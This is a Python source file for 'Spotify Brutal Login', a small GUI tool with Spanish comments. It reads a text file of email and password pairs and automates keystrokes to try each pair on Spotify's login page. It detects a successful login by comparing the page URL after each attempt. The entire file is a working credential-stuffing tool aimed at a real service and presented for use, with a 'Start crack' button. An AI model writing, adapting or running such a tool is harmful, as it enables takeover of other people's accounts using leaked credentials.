

# Brutal Login v2 

# Version: 2.0 "Nightmare"
# Creadores: [Kirari,Bélgica]


import os
import sys
import time
import argparse
import pyautogui
import webbrowser
import tkinter as tk
import pyperclip as p

from PIL import Image, ImageTk
from pynput.keyboard import Key, Controller
from tkinter.filedialog import askopenfilename


file = None

# OBTENER DATOS 

def get_raw_data(accounts):
	data = []
	# file = open(load,"r")
	# for line in file.readline():
	with open(accounts,"r") as file:
		for line in file.readlines():
	 		data.append((line).strip())

	return data


# ACORTADOR POR @

def shortening(data):

	new_data = []

	for user in data:
		# Separa al usuario por -> correo y password
		data_user = user.split()
		# Separa al correo por @
		new_data.append([data_user[0].split("@"),data_user[1]])

	return new_data

		
# BOT CRACKING 

def passdecoder(data):

	link = "https://accounts.spotify.com/es-ES/login"
	keyboard = Controller()
	
	information = shortening(data)

	pyautogui.press("esc")

	for user in information:

		# Vaciar casilla
		pyautogui.hotkey("ctrl","a")
		pyautogui.press("del")
		time.sleep(1.5)

		# Casilla Correo
		pyautogui.typewrite(user[0][0])
		keyboard.press("@")
		pyautogui.typewrite(user[0][1])

		# Casilla Password
		pyautogui.press("tab")
		pyautogui.typewrite(user[1])

		# Login
		pyautogui.press("tab",presses=2)
		pyautogui.press("enter")
		time.sleep(2)

		# Comparacion de acceso
		pyautogui.press("f6")
		pyautogui.hotkey("ctrl","c")

		if p.paste() != link:
			#print(" [\033[0;32m+\033[0;39m] " + user[0][0] + "@" + user[0][1] + " : " + user[1] + " -> Account Found!\n\n")
			return True

		#print(" [\033[0;31mx\033[0;39m] " + user[0][0] + "@" + user[0][1] + " : " + user[1])

		# En caso de error, refrescar pagina
		time.sleep(1.5)
		pyautogui.press('f5')
		time.sleep(2)

	return

	# CARGA DE CUENTAS

def loadaccounts():
	global file 
	load = tk.filedialog.askopenfilename()
	if load.endswith(".txt"):
		file= load
	else:
		if file != None:
			pyautogui.alert("Choose a .txt file")					
		
	return 


# COMIENZO DEL LOGIN AUTOMATICO

def LoginBrutal():
	try:
		filename = file
		data = get_raw_data(filename)
		webbrowser.open("https://accounts.spotify.com/es-ES/login")
		time.sleep(3)
		passdecoder(data)
	except:
		pyautogui.alert("No .txt files have been uploaded")	
	

	return

def exit():
    sys.exit(0)
  
# INTERFACE PARA EL PROGRAMA PRINCIPAL

def interface():

	gui = tk.Tk()

	image = Image.open("C:\\Users\\hex\\Desktop\\Brutal Login\\Brutal Login\\files\\background.jpg")
	photo = ImageTk.PhotoImage(image)
	background_label = tk.Label(gui, image=photo)
	background_label.place(x=0, y=0, relwidth=1, relheight=1)

	gui.configure(bg="black")

	btndec = tk.Button(gui,text="Start crack",width=15,height=2,background="#1ed65f",borderwidth=0,foreground="black",command=LoginBrutal)
	btndec.place(relx=0.5, rely=0.4, anchor=tk.CENTER)

	btnch = tk.Button(gui,text="Load Accounts",width=15,height=2,background="#1ed65f",borderwidth=0,foreground="black",command= loadaccounts)
	btnch.place(relx=0.5, rely=0.6, anchor=tk.CENTER)
	
	btnsal = tk.Button(gui,text="Exit",width=15,height=2,background="#1ed65f",borderwidth=0,foreground="black",command=exit)
	btnsal.place(relx=0.5, rely=0.8, anchor=tk.CENTER)
	
	# Datos ventana
	gui.resizable(0,0)
	gui.title("Spotify Brutal Login")
	gui.geometry("500x400")
	#gui.iconbitmap("phpThumb_generated_thumbnailico")

	gui.mainloop()

	return


# PROGRAMA PRINCIPAL

if __name__ == '__main__':
	interface()
	sys.exit(0)
